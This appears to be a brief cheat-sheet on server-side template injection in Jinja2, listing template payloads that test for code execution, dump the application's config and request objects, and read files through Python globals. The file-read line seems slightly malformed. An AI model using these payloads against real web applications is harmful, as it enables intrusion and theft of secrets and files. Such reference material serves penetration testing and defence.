# Server Side Template Injection

Jinja2 templates can access python objects when not sandboxed.

```python
# prove code execution (see the result reflected somewhere)
{{ 5 * 5 }}

# enumerate context / see available objects to leverage
{{ config.items() }}
{{ request.__dict__ }}

# read files in the web application directory
{{ request.application.__globals__.builtins__.open('file.txt').read() }}
```